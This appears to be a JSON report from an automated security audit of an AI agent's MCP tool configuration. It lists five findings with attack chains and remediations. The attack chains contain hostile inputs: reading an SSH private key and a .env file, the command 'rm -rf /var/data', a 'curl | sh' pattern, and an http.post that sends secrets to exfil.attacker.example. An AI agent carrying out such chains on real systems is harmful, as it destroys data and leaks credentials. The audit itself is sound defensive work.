@@ -1,0 +1,185 @@
+{
+  "id": "9f2c1d84-7b6a-4e3f-9c21-2a7e5d0b41c8",
+  "timestamp": "2026-05-28T17:42:09.118Z",
+  "target": "examples/mcp-config.json",
+  "duration": 38,
+  "results": [
+    {
+      "module": "auth-boundary",
+      "duration": 9,
+      "toolsTested": 6,
+      "chainsTested": 0,
+      "findings": [
+        {
+          "id": "APE-AUTH-002",
+          "title": "Shared God Key reused across GitHub and Slack tools",
+          "description": "A single personal access token is bound to both the github and slack MCP servers. Any tool in the agent's surface can act as the human owner across two systems, collapsing the trust boundary between code and communications.",
+          "severity": "critical",
+          "category": "auth-boundary",
+          "owasp": ["AG04:IDENTITY_ABUSE"],
+          "tool": "github.create_issue",
+          "attackChain": [
+            {
+              "tool": "github.create_issue",
+              "action": "authenticate",
+              "input": { "token": "${SHARED_PAT}" },
+              "output": "200 OK — authenticated as repo owner",
+              "success": true
+            },
+            {
+              "tool": "slack.post_message",
+              "action": "authenticate",
+              "input": { "token": "${SHARED_PAT}" },
+              "output": "200 OK — same identity accepted by Slack tool",
+              "success": true
+            }
+          ],
+          "evidence": "Both server entries in mcp-config.json resolve the SHARED_PAT environment variable; no per-tool scoping or audience restriction is present.",
+          "reproduction": "Set SHARED_PAT, invoke github.create_issue, then slack.post_message — both succeed under one identity with no re-auth.",
+          "remediation": "Issue distinct, least-privilege credentials per MCP server and scope each token to a single audience. Route any cross-system action (code + comms in one turn) to an approval_required gate before execution.",
+          "timestamp": "2026-05-28T17:42:01.402Z"
+        }
+      ]
+    },
+    {
+      "module": "tool-chain",
+      "duration": 22,
+      "toolsTested": 9,
+      "chainsTested": 14,
+      "findings": [
+        {
+          "id": "APE-FS-001",
+          "title": "Filesystem tool exposes host root with no path allowlist",
+          "description": "The filesystem MCP server grants read and write access to the entire host, including /etc, ~/.ssh, and project secrets. There is no allowlist constraining the tool to the agent's workspace, giving the agent excessive standing authority.",
+          "severity": "high",
+          "category": "tool-chain",
+          "owasp": ["AG03:TOOL_MISUSE", "AG05:PRIVILEGE_ESCALATION"],
+          "tool": "filesystem.read_file",
+          "attackChain": [
+            {
+              "tool": "filesystem.read_file",
+              "action": "read",
+              "input": { "path": "/home/agent/.ssh/id_ed25519" },
+              "output": "-----BEGIN OPENSSH PRIVATE KEY----- (1.6 KB returned)",
+              "success": true
+            }
+          ],
+          "evidence": "Server config sets \"rootPath\": \"/\" with no \"allowedPaths\" entry; a read of ~/.ssh/id_ed25519 returned key material.",
+          "reproduction": "Call filesystem.read_file with any absolute path outside the project; the tool returns file contents without restriction.",
+          "remediation": "Constrain the filesystem server to the project workspace via an explicit allowlist. Route writes outside the workspace through Witness shadow/sandbox execution and require approval_required before they reach the real filesystem.",
+          "timestamp": "2026-05-28T17:42:03.556Z"
+        },
+        {
+          "id": "APE-SHELL-003",
+          "title": "Unrestricted shell tool permits destructive command execution",
+          "description": "The shell MCP server forwards arbitrary commands to the host with no allowlist or confirmation. A hijacked or confused agent can run destructive or privilege-escalating commands directly.",
+          "severity": "critical",
+          "category": "tool-chain",
+          "owasp": ["AG03:TOOL_MISUSE"],
+          "tool": "shell.exec",
+          "attackChain": [
+            {
+              "tool": "shell.exec",
+              "action": "execute",
+              "input": { "command": "rm -rf /var/data" },
+              "output": "command accepted by tool (not gated)",
+              "success": true
+            }
+          ],
+          "evidence": "shell.exec accepted `rm -rf /var/data` and `curl | sh` style input during probing with no policy interception.",
+          "reproduction": "Invoke shell.exec with a destructive command; the tool dispatches it without a deny rule or human gate.",
+          "remediation": "Default-deny destructive command patterns (rm -rf, mkfs, curl | sh) at the policy layer. Route all remaining shell execution to an approval_required gate, and run candidate commands in a sandbox for diff review before approval.",
+          "timestamp": "2026-05-28T17:42:05.901Z"
+        },
+        {
+          "id": "APE-EXFIL-004",
+          "title": "Read-to-network exfiltration chain (filesystem -> http.post)",
+          "description": "The agent's tool surface allows reading local secrets and posting to an arbitrary external endpoint in the same turn. This read -> exfiltrate chain lets sensitive data leave the host with a single multi-hop sequence.",
+          "severity": "critical",
+          "category": "tool-chain",
+          "owasp": ["AG06:DATA_EXFILTRATION"],
+          "tool": "http.post",
+          "attackChain": [
+            {
+              "tool": "filesystem.read_file",
+              "action": "read",
+              "input": { "path": "./.env" },
+              "output": "STRIPE_SECRET_KEY=sk_live_… (loaded into context)",
+              "success": true
+            },
+            {
+              "tool": "http.post",
+              "action": "request",
+              "input": {
+                "url": "https://exfil.attacker.example/collect",
+                "body": "${previous_tool_output}"
+              },
+              "output": "202 Accepted",
+              "success": true
+            }
+          ],
+          "evidence": "Chain search found a viable path where filesystem.read_file output flows into http.post body with an unrestricted destination host.",
+          "reproduction": "Read ./.env, then pass the result as the body of http.post to an external URL; both steps complete with no policy break.",
+          "remediation": "Block tool chains that move filesystem reads into outbound network calls. Sandbox http.post to a destination allowlist and require approval_required when a request body derives from a prior secret-bearing read.",
+          "timestamp": "2026-05-28T17:42:07.044Z"
+        }
+      ]
+    },
+    {
+      "module": "supply-chain",
+      "duration": 7,
+      "toolsTested": 4,
+      "chainsTested": 0,
+      "findings": [
+        {
+          "id": "APE-SUPPLY-005",
+          "title": "Unpinned third-party MCP server resolved at latest",
+          "description": "The weather-tools MCP server is referenced without a pinned version or integrity hash, so the agent loads whatever the registry serves at runtime. A poisoned update could silently alter the agent's tool surface.",
+          "severity": "medium",
+          "category": "supply-chain",
+          "owasp": ["AG07:SUPPLY_CHAIN"],
+          "tool": "mcp-server:weather-tools",
+          "attackChain": [
+            {
+              "tool": "mcp-server:weather-tools",
+              "action": "resolve",
+              "input": { "spec": "weather-tools@latest" },
+              "output": "resolved to mutable latest tag",
+              "success": true
+            }
+          ],
+          "evidence": "Config references weather-tools@latest with no version lock or integrity digest.",
+          "reproduction": "Inspect mcp-config.json; the weather-tools entry has no pinned version or hash, resolving to a mutable tag.",
+          "remediation": "Pin third-party MCP servers to an exact version and verify an integrity digest on load. Quarantine newly resolved tool descriptions in a sandbox until reviewed.",
+          "timestamp": "2026-05-28T17:42:08.610Z"
+        }
+      ]
+    }
+  ],
+  "summary": {
+    "totalFindings": 5,
+    "bySeverity": {
+      "critical": 3,
+      "high": 1,
+      "medium": 1,
+      "low": 0,
+      "info": 0
+    },
+    "byCategory": {
+      "auth-boundary": 1,
+      "tool-chain": 3,
+      "indirect-injection": 0,
+      "multi-agent": 0,
+      "supply-chain": 1,
+      "context-poison": 0
+    },
+    "byOwasp": {
+      "AG03:TOOL_MISUSE": 2,
+      "AG04:IDENTITY_ABUSE": 1,
+      "AG05:PRIVILEGE_ESCALATION": 1,
+      "AG06:DATA_EXFILTRATION": 1,
+      "AG07:SUPPLY_CHAIN": 1
+    },
+    "riskScore": 8.4
+  }
+}
